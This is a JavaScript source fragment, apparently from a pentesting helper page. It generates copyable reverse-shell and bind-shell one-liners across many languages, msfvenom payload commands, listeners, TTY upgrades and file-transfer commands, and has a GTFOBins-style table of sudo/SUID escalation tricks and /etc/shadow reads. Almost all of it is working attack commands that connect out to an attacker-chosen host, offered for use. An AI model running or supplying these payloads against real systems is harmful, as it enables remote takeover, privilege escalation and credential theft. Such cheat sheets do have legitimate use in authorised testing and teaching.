    {name:'PHP exec',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP shell_exec',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP system',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP passthru',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");\''},
    {name:'PHP popen',lang:'PHP',os:'linux',cmd:'php -r \'$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");\''},
    {name:'PHP proc_open',lang:'PHP',os:'linux',cmd:'php -r \'$s=fsockopen("{ip}",{port});proc_open("{shell}",[$s,$s,$s],$p);\''},
    {name:'PHP cmd small',lang:'PHP',os:'any',cmd:'<'+'?=`$_GET[0]`?'+'>'},
    {name:'Python #1',lang:'Python',os:'linux',cmd:'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\''},
    {name:'Python #2',lang:'Python',os:'linux',cmd:'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")\''},
    {name:'Python3 #1',lang:'Python',os:'linux',cmd:'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\''},
    {name:'Python3 #2',lang:'Python',os:'linux',cmd:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")\''},
    {name:'Python3 shortest',lang:'Python',os:'linux',cmd:'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")\''},
    {name:'Perl',lang:'Perl',os:'linux',cmd:'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};\''},
    {name:'Perl no sh',lang:'Perl',os:'linux',cmd:'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''},
    {name:'Ruby #1',lang:'Ruby',os:'linux',cmd:'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))\''},
    {name:'Ruby no sh',lang:'Ruby',os:'linux',cmd:'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\''},
    {name:'PowerShell #1',lang:'PowerShell',os:'windows',cmd:'$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'},
    {name:'PowerShell #2',lang:'PowerShell',os:'windows',cmd:'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$client.Close()"'},
    {name:'PowerShell Base64',lang:'PowerShell',os:'windows',cmd:'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAewBpAHAAfQAnACwAewBwAG8AcgB0AH0AKQA='},
    {name:'Socat #1',lang:'Socat',os:'linux',cmd:'socat exec:\'{shell}\'[,pty,stderr,setsid,sigint,sane] tcp:{ip}:{port}'},
    {name:'Socat #2 (tty)',lang:'Socat',os:'linux',cmd:'socat TCP:{ip}:{port} EXEC:{shell},pty,stderr,setsid,sigint,sane'},
    {name:'Lua #1',lang:'Lua',os:'linux',cmd:'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'{shell} -i <&3 >&3 2>&3\');"'},
    {name:'Lua #2',lang:'Lua',os:'linux',cmd:'lua5.1 -e \'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''},
    {name:'Java Runtime',lang:'Java',os:'linux',cmd:'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()'},
    {name:'Awk',lang:'Awk',os:'linux',cmd:'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\''},
    {name:'Node.js',lang:'JavaScript',os:'linux',cmd:'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("{shell}", []);var client = new net.Socket();client.connect({port}, "{ip}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'},
    {name:'Groovy',lang:'Groovy',os:'linux',cmd:'String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'},
],
bind: [
    {name:'nc -e bind',lang:'Netcat',os:'linux',cmd:'nc -lvp {port} -e {shell}'},
    {name:'nc mkfifo bind',lang:'Netcat',os:'linux',cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc -lvp {port} >/tmp/f'},
    {name:'Python bind',lang:'Python',os:'linux',cmd:'python -c \'import socket,os;s=socket.socket();s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("{shell}")\''},
    {name:'PHP bind',lang:'PHP',os:'linux',cmd:'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))die;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\';'},
    {name:'Perl bind',lang:'Perl',os:'linux',cmd:'perl -e \'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack("l",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};\''},
    {name:'Socat bind',lang:'Socat',os:'linux',cmd:'socat TCP-LISTEN:{port},reuseaddr,fork EXEC:{shell},pty,stderr,setsid,sigint,sane'},
    {name:'PowerShell bind',lang:'PowerShell',os:'windows',cmd:'powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(\'0.0.0.0\',{port});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"'},
],
msfvenom: [
    {name:'Linux ELF x86',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf'},
    {name:'Linux ELF x64',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf'},
    {name:'Windows EXE',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe'},
    {name:'Windows x64 EXE',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe'},
    {name:'Meterpreter Linux',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > meterpreter.elf'},
    {name:'Meterpreter Windows',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > meterpreter.exe'},
    {name:'PHP Meterpreter',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php'},
    {name:'ASP Meterpreter',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp'},
    {name:'JSP Reverse',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp'},
    {name:'WAR Reverse',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war'},
    {name:'Python Reverse',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw'},
    {name:'Bash Reverse',lang:'MSFVenom',os:'linux',cmd:'msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw'},
    {name:'DLL Reverse',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f dll > shell.dll'},
    {name:'HTA Reverse',lang:'MSFVenom',os:'windows',cmd:'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f hta-psh > shell.hta'},
],
listeners: [
    {name:'Netcat Listener',lang:'Listener',os:'any',cmd:'nc -lvnp {port}'},
    {name:'Netcat (rlwrap)',lang:'Listener',os:'any',cmd:'rlwrap nc -lvnp {port}'},
    {name:'Socat Listener',lang:'Listener',os:'any',cmd:'socat file:`tty`,raw,echo=0 TCP-LISTEN:{port}'},
    {name:'Socat Listener (TTY)',lang:'Listener',os:'any',cmd:'socat TCP-LISTEN:{port},reuseaddr FILE:`tty`,raw,echo=0'},
    {name:'Metasploit Handler',lang:'Listener',os:'any',cmd:'msfconsole -q -x "use multi/handler; set payload {shell}; set LHOST {ip}; set LPORT {port}; exploit"'},
    {name:'pwncat Listener',lang:'Listener',os:'any',cmd:'pwncat-cs -lp {port}'},
],
upgrade: [
    {name:'Python PTY',lang:'TTY',os:'linux',cmd:'python -c \'import pty;pty.spawn("{shell}")\''},
    {name:'Python3 PTY',lang:'TTY',os:'linux',cmd:'python3 -c \'import pty;pty.spawn("{shell}")\''},
    {name:'Script PTY',lang:'TTY',os:'linux',cmd:'script -qc {shell} /dev/null'},
    {name:'Expect PTY',lang:'TTY',os:'linux',cmd:'expect -c \'spawn {shell}; interact\''},
    {name:'Socat TTY',lang:'TTY',os:'linux',cmd:'socat exec:\'{shell}\'[,pty,stderr,setsid,sigint,sane] tcp:{ip}:{port}'},
    {name:'Full TTY Upgrade',lang:'TTY',os:'linux',cmd:'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n# Ctrl+Z\nstty raw -echo; fg\nexport SHELL=/bin/bash\nexport TERM=xterm-256color\nstty rows 38 columns 116'},
    {name:'rlwrap fix',lang:'TTY',os:'linux',cmd:'rlwrap -cAr nc -lvnp {port}'},
],
transfer: [
    {name:'Python HTTP Server',lang:'Transfer',os:'linux',cmd:'python3 -m http.server {port}'},
    {name:'Python2 HTTP Server',lang:'Transfer',os:'linux',cmd:'python -m SimpleHTTPServer {port}'},
    {name:'PHP HTTP Server',lang:'Transfer',os:'any',cmd:'php -S 0.0.0.0:{port}'},
    {name:'wget download',lang:'Transfer',os:'linux',cmd:'wget http://{ip}:{port}/file -O /tmp/file'},
    {name:'curl download',lang:'Transfer',os:'linux',cmd:'curl http://{ip}:{port}/file -o /tmp/file'},
    {name:'PowerShell download',lang:'Transfer',os:'windows',cmd:'powershell -c "(New-Object Net.WebClient).DownloadFile(\'http://{ip}:{port}/file\',\'C:\\Users\\Public\\file\')"'},
    {name:'PowerShell IWR',lang:'Transfer',os:'windows',cmd:'powershell -c "Invoke-WebRequest -Uri \'http://{ip}:{port}/file\' -OutFile \'C:\\Users\\Public\\file\'"'},
    {name:'certutil download',lang:'Transfer',os:'windows',cmd:'certutil -urlcache -split -f http://{ip}:{port}/file C:\\Users\\Public\\file'},
    {name:'Bash /dev/tcp',lang:'Transfer',os:'linux',cmd:'cat < /dev/tcp/{ip}/{port} > /tmp/file'},
    {name:'nc receive',lang:'Transfer',os:'linux',cmd:'nc -lvp {port} > file'},
    {name:'nc send',lang:'Transfer',os:'linux',cmd:'nc {ip} {port} < file'},
    {name:'SMB Server (impacket)',lang:'Transfer',os:'linux',cmd:'impacket-smbserver share . -smb2support'},
    {name:'SMB copy (Windows)',lang:'Transfer',os:'windows',cmd:'copy \\\\{ip}\\share\\file C:\\Users\\Public\\file'},
]
};

function renderRsGrid() {
    const ip = $('rs-ip').value || '10.10.14.1';
    const port = $('rs-port').value || '4444';
    const shell = $('rs-shell').value || '/bin/bash';
    const osFilter = $('rs-os').value;
    const shells = RS_DATA[activeRsTab] || [];
    document.querySelectorAll('[id^="rs-tab-"]').forEach(b => b.style.borderColor = 'var(--border)');
    var activeTab = $('rs-tab-' + activeRsTab);
    if (activeTab) activeTab.style.borderColor = 'var(--accent)';
    let html = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:12px">';
    shells.forEach(s => {
        if (osFilter !== 'all' && s.os !== osFilter && s.os !== 'any') return;
        const cmd = s.cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port).replace(/\{shell\}/g, shell);
        const osBadge = s.os === 'linux' ? '<span class="badge badge-green">Linux</span>' : s.os === 'windows' ? '<span class="badge badge-blue">Windows</span>' : '<span class="badge badge-purple">Any</span>';
        html += '<div class="card" style="padding:12px;cursor:pointer" onclick="copyText(this.querySelector(\'.code-box\').textContent)">';
        html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><strong style="font-size:13px">' + esc(s.name) + '</strong><div style="display:flex;gap:4px">' + osBadge + '<span class="badge badge-orange">' + esc(s.lang) + '</span></div></div>';
        html += '<div class="code-box" style="font-size:11px">' + esc(cmd) + '</div></div>';
    });
    html += '</div>';
    $('rs-grid').innerHTML = html;
}
renderRsGrid();

// ===== GTFOBINS DATA =====
var GTFO_DATA = [
    {name:'awk',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo awk \'BEGIN {system("/bin/sh")}\'',suid:'./awk \'BEGIN {system("/bin/sh")}\'','reverse-shell':'awk \'BEGIN {s="/inet/tcp/0/{ip}/{port}";while(42){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}\''}},
    {name:'base64',cats:['file-read','suid'],cmds:{'file-read':'base64 /etc/shadow | base64 -d',suid:'./base64 /etc/shadow | base64 -d'}},
    {name:'bash',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo bash',suid:'bash -p','reverse-shell':'bash -i >& /dev/tcp/{ip}/{port} 0>&1'}},
    {name:'busybox',cats:['sudo','suid'],cmds:{sudo:'sudo busybox sh',suid:'./busybox sh'}},
    {name:'cat',cats:['file-read','suid'],cmds:{'file-read':'cat /etc/shadow',suid:'./cat /etc/shadow'}},
    {name:'chmod',cats:['sudo','suid'],cmds:{sudo:'sudo chmod u+s /bin/bash',suid:'./chmod 4755 /bin/bash'}},
    {name:'chown',cats:['sudo'],cmds:{sudo:'sudo chown root:root /bin/bash && sudo chmod u+s /bin/bash'}},
    {name:'cp',cats:['sudo','suid','file-write'],cmds:{sudo:'sudo cp /bin/bash /tmp/bash && sudo chmod u+s /tmp/bash',suid:'./cp /etc/shadow /tmp/shadow','file-write':'cp malicious /target'}},
    {name:'cpulimit',cats:['sudo','suid'],cmds:{sudo:'sudo cpulimit -l 100 -f /bin/sh',suid:'./cpulimit -l 100 -f -- /bin/sh -p'}},
    {name:'curl',cats:['file-read','file-write','sudo'],cmds:{'file-read':'curl file:///etc/shadow','file-write':'curl http://attacker/shell -o /tmp/shell',sudo:'sudo curl file:///etc/shadow'}},
    {name:'cut',cats:['file-read','suid'],cmds:{'file-read':'cut -d "" -f1 /etc/shadow',suid:'./cut -d "" -f1 /etc/shadow'}},
    {name:'dash',cats:['sudo','suid'],cmds:{sudo:'sudo dash',suid:'dash -p'}},
    {name:'dd',cats:['file-read','file-write','suid'],cmds:{'file-read':'dd if=/etc/shadow','file-write':'echo "data" | dd of=/target',suid:'./dd if=/etc/shadow'}},
    {name:'diff',cats:['file-read','suid'],cmds:{'file-read':'diff --line-format=%L /dev/null /etc/shadow',suid:'./diff --line-format=%L /dev/null /etc/shadow'}},
    {name:'dmesg',cats:['sudo','suid'],cmds:{sudo:'sudo dmesg -H\n!/bin/sh',suid:'./dmesg -H\n!/bin/sh'}},
    {name:'docker',cats:['sudo','suid'],cmds:{sudo:'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh',suid:'docker run -v /:/mnt --rm -it alpine chroot /mnt sh'}},
    {name:'dpkg',cats:['sudo'],cmds:{sudo:'sudo dpkg -l\n!/bin/sh'}},
    {name:'ed',cats:['sudo','suid'],cmds:{sudo:'sudo ed\n!/bin/sh',suid:'./ed\n!/bin/sh'}},
    {name:'emacs',cats:['sudo','suid'],cmds:{sudo:'sudo emacs -Q -nw --eval \'(term "/bin/sh")\'',suid:'./emacs -Q -nw --eval \'(term "/bin/sh")\''}},
    {name:'env',cats:['sudo','suid'],cmds:{sudo:'sudo env /bin/sh',suid:'./env /bin/sh'}},
    {name:'expect',cats:['sudo','suid'],cmds:{sudo:'sudo expect -c \'spawn /bin/sh;interact\'',suid:'./expect -c \'spawn /bin/sh;interact\''}},
    {name:'facter',cats:['sudo'],cmds:{sudo:'TF=$(mktemp -d)\necho \'exec("/bin/sh")\' > $TF/x.rb\nsudo FACTERLIB=$TF facter'}},
    {name:'file',cats:['file-read','suid'],cmds:{'file-read':'file -f /etc/shadow',suid:'./file -f /etc/shadow'}},
    {name:'find',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo find . -exec /bin/sh \\;',suid:'find . -exec /bin/sh -p \\; -quit','reverse-shell':'find . -exec bash -c \'bash -i >& /dev/tcp/{ip}/{port} 0>&1\' \\;'}},
    {name:'flock',cats:['sudo','suid'],cmds:{sudo:'sudo flock -u / /bin/sh',suid:'./flock -u / /bin/sh'}},
    {name:'ftp',cats:['sudo'],cmds:{sudo:'sudo ftp\n!/bin/sh'}},
    {name:'gcc',cats:['sudo'],cmds:{sudo:'sudo gcc -wrapper /bin/sh,-s .'}},
    {name:'gdb',cats:['sudo','suid','capabilities'],cmds:{sudo:'sudo gdb -nx -ex \'python import os; os.execl("/bin/sh","sh","-p")\' -ex quit',suid:'./gdb -nx -ex \'python import os; os.execl("/bin/sh","sh","-p")\' -ex quit',capabilities:'./gdb -nx -ex \'python import os; os.setuid(0)\' -ex \'!sh\' -ex quit'}},
    {name:'git',cats:['sudo','suid'],cmds:{sudo:'sudo git -p help\n!/bin/sh',suid:'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help'}},
    {name:'grep',cats:['file-read','suid'],cmds:{'file-read':'grep -r "" /etc/shadow',suid:'./grep -r "" /etc/shadow'}},
    {name:'head',cats:['file-read','suid'],cmds:{'file-read':'head -c 1G /etc/shadow',suid:'./head -c 1G /etc/shadow'}},
    {name:'ip',cats:['sudo'],cmds:{sudo:'sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo'}},
    {name:'irb',cats:['sudo'],cmds:{sudo:'sudo irb\nexec "/bin/sh"'}},
    {name:'jjs',cats:['sudo','suid'],cmds:{sudo:'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)\').waitFor()" | sudo jjs',suid:'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs'}},
    {name:'journalctl',cats:['sudo'],cmds:{sudo:'sudo journalctl\n!/bin/sh'}},
    {name:'knife',cats:['sudo'],cmds:{sudo:'sudo knife exec -E \'exec "/bin/sh"\''}},
    {name:'ld.so',cats:['sudo','suid'],cmds:{sudo:'sudo /lib/ld.so /bin/sh',suid:'/lib/ld.so /bin/sh'}},
    {name:'less',cats:['sudo','suid','file-read'],cmds:{sudo:'sudo less /etc/shadow\n!/bin/sh',suid:'./less /etc/shadow\n!/bin/sh','file-read':'less /etc/shadow'}},
    {name:'ltrace',cats:['sudo'],cmds:{sudo:'sudo ltrace -b -L /bin/sh'}},
    {name:'lua',cats:['sudo','suid'],cmds:{sudo:'sudo lua -e \'os.execute("/bin/sh")\'',suid:'./lua -e \'os.execute("/bin/sh")\''}},
    {name:'make',cats:['sudo','suid'],cmds:{sudo:'COMMAND=\'/bin/sh\'\nsudo make -s --eval=$\'x:\\n\\t-\'$COMMAND',suid:'COMMAND=\'/bin/sh\'\n./make -s --eval=$\'x:\\n\\t-\'$COMMAND'}},
    {name:'man',cats:['sudo','suid'],cmds:{sudo:'sudo man man\n!/bin/sh',suid:'./man man\n!/bin/sh'}},
    {name:'more',cats:['sudo','suid','file-read'],cmds:{sudo:'sudo more /etc/shadow\n!/bin/sh',suid:'./more /etc/shadow\n!/bin/sh','file-read':'more /etc/shadow'}},
    {name:'mount',cats:['sudo'],cmds:{sudo:'sudo mount -o bind /bin/sh /bin/mount\nsudo mount'}},
    {name:'mv',cats:['sudo'],cmds:{sudo:'sudo mv /bin/sh /bin/mv\nsudo mv'}},
    {name:'mysql',cats:['sudo'],cmds:{sudo:'sudo mysql -e \'\\! /bin/sh\''}},
    {name:'nano',cats:['sudo','suid','file-write'],cmds:{sudo:'sudo nano\n^R^X\nreset; sh 1>&0 2>&0',suid:'./nano\n^R^X\nreset; sh 1>&0 2>&0','file-write':'nano /etc/shadow'}},
    {name:'nmap',cats:['sudo','suid'],cmds:{sudo:'sudo nmap --interactive\nnmap> !sh',suid:'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\nnmap --script=$TF'}},
    {name:'node',cats:['sudo','suid'],cmds:{sudo:'sudo node -e \'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})\'',suid:'./node -e \'require("child_process").spawn("/bin/sh",["-p"],{stdio:[0,1,2]})\''}},
    {name:'openssl',cats:['file-read','file-write'],cmds:{'file-read':'openssl enc -in /etc/shadow','file-write':'echo "data" | openssl enc -out /target'}},
    {name:'perl',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo perl -e \'exec "/bin/sh";\'',suid:'./perl -e \'exec "/bin/sh";\'','reverse-shell':'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''}},
    {name:'php',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo php -r "system(\\"/bin/sh\\");"',suid:'./php -r "system(\\"/bin/sh -p\\");"','reverse-shell':'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''}},
    {name:'pic',cats:['sudo','suid'],cmds:{sudo:'sudo pic -U\n.PS\nsh X sh X',suid:'./pic -U\n.PS\nsh X sh X'}},
    {name:'pip',cats:['sudo'],cmds:{sudo:'TF=$(mktemp -d)\necho "import os; os.execl(\'/bin/sh\',\'sh\',\'-c\',\'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py\nsudo pip install $TF'}},
    {name:'pkexec',cats:['sudo'],cmds:{sudo:'sudo pkexec /bin/sh'}},
    {name:'puppet',cats:['sudo'],cmds:{sudo:'sudo puppet apply -e "exec { \'/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"\': }"'}},
    {name:'python',cats:['sudo','suid','capabilities','reverse-shell'],cmds:{sudo:'sudo python -c \'import os;os.system("/bin/sh")\'',suid:'./python -c \'import os;os.execl("/bin/sh","sh","-p")\'',capabilities:'./python -c \'import os;os.setuid(0);os.system("/bin/sh")\'','reverse-shell':'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''}},
    {name:'rake',cats:['sudo'],cmds:{sudo:'sudo rake -p \'`/bin/sh 1>&0`\''}},
    {name:'rpm',cats:['sudo'],cmds:{sudo:'sudo rpm --eval \'%{lua:os.execute("/bin/sh")}\''}},
    {name:'rsync',cats:['sudo','suid'],cmds:{sudo:'sudo rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',suid:'./rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null'}},
    {name:'ruby',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo ruby -e \'exec "/bin/sh"\'',suid:'./ruby -e \'exec "/bin/sh"\'','reverse-shell':'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''}},
    {name:'rvim',cats:['sudo'],cmds:{sudo:'sudo rvim -c \':py import os; os.execl("/bin/sh","sh","-c","reset; exec sh")\''}},
    {name:'scp',cats:['sudo'],cmds:{sudo:'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x $TF\nsudo scp -S $TF x y:'}},
    {name:'screen',cats:['sudo'],cmds:{sudo:'sudo screen'}},
    {name:'sed',cats:['sudo','suid','file-read'],cmds:{sudo:'sudo sed -n \'1e exec sh 1>&0\' /etc/hosts',suid:'./sed -n \'1e exec sh 1>&0\' /etc/hosts','file-read':'sed "" /etc/shadow'}},
    {name:'service',cats:['sudo'],cmds:{sudo:'sudo service ../../bin/sh'}},
    {name:'socat',cats:['sudo','suid','reverse-shell'],cmds:{sudo:'sudo socat stdin exec:/bin/sh',suid:'./socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane','reverse-shell':'socat TCP:{ip}:{port} EXEC:{shell},pty,stderr,setsid,sigint,sane'}},
    {name:'sqlite3',cats:['sudo'],cmds:{sudo:'sudo sqlite3 /dev/null \'.shell /bin/sh\''}},
    {name:'ssh',cats:['sudo'],cmds:{sudo:'sudo ssh -o ProxyCommand=\';sh 0<&2 1>&2\' x'}},
    {name:'strace',cats:['sudo','suid'],cmds:{sudo:'sudo strace -o /dev/null /bin/sh',suid:'./strace -o /dev/null /bin/sh'}},
    {name:'tail',cats:['file-read','suid'],cmds:{'file-read':'tail -c 1G /etc/shadow',suid:'./tail -c 1G /etc/shadow'}},
    {name:'tar',cats:['sudo','suid'],cmds:{sudo:'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',suid:'./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'}},
